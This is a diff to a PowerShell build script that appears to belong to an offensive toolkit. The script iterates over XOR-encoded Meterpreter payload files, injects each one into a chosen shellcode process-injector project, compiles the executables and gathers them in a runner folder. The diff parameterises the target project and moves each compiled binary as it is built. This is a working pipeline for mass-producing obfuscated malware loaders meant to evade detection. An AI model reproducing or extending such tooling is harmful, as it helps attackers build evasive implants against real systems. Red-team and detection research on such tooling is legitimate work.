@@ -1,3 +1,11 @@
+param (
+    [Parameter(Mandatory = $true)]
+    [string]$TargetProjectFolder,
+
+    [Parameter(Mandatory = $false)]
+    [string]$XORPayloadFilePath
+)
+
 $runner_folder = "runner_executables"
 
 # Remove old xor_met_payloads folder
@@ -9,8 +17,10 @@ if (Test-Path $runner_folder) {
 }
 
 mkdir .\\$runner_folder
+mkdir "./${runner_folder}/${TargetProjectFolder}"
+$destination_runner_folder = "./${runner_folder}/${TargetProjectFolder}"
 
-# Specify the folder path where you want to search
+# Specify the folder path where you want to search for payloads
 $met_payloads_path = "/met_payloads/"
 
 # Get all files recursively
@@ -21,19 +31,30 @@ foreach ($file in $files) {
     # Check if the file name starts with "xor_"
     if ($file.Name -like "xor_*") {
         $XorPayloadPath = $file.FullName
-        & './2.1_replace_payload_with_XOR_payload.ps1' './Shellcode Process Injector' $XorPayloadPath
-        & './2.2_compile_shellcode_process_injector.ps1' './Shellcode Process Injector' $XorPayloadPath
+        & './2.1_replace_payload_with_XOR_payload.ps1' $TargetProjectFolder $XorPayloadPath
+        $outputFileString = & './2.2_compile_shellcode_process_injector.ps1' $TargetProjectFolder $XorPayloadPath
+        Write-Host "Compiled $TargetProjectFolder executable with payload $XorPayloadPath"
+        
+        $outputFile = Get-ChildItem -Path $outputFileString[3] -File
 
-        Write-Host "Executed compile_shellcode_process_injector.ps1 for: $XorPayloadPath"
+
+        Move-Item -Path $outputFile -Destination $destination_runner_folder
+        Write-Host "Moved $($outputFile.FullName) to ${destination_runner_folder.FullName}"
     }
 }
 
-# Move all the ShellcodeInjector executables to $runner_folder
-# Get all files starting with "ShellcodeProcessInjector_" in the source folder
-$filesToMove = Get-ChildItem -Path './' -File | Where-Object { $_.Name -like "ShellcodeProcessInjector_*" }
+$scriptName = $MyInvocation.MyCommand.Name
+Write-Host "${scriptName} done!"
 
-# Move each file to the destination $runner_folder
-foreach ($file in $filesToMove) {
-    Move-Item -Path $file.FullName -Destination $runner_folder
-    Write-Host "Moved $($file.Name) to $runner_folder"
-}
+
+# # Move all the ShellcodeInjector executables to $runner_folder
+# # Get all files starting with the executable's name in the source folder
+# $prepended_executable_name = $TargetProjectFolder
+# $prepended_executable_name = $prepended_executable_name -replace " ", ""
+# $filesToMove = Get-ChildItem -Path './' -File | Where-Object { $_.Name -like "${prepended_executable_name}_*" }
+
+# # Move each file to the destination $runner_folder
+# foreach ($file in $filesToMove) {
+#     Move-Item -Path $file.FullName -Destination $destination_runner_folder
+#     Write-Host "Moved $($file.Name) to $destination_runner_folder"
+# }
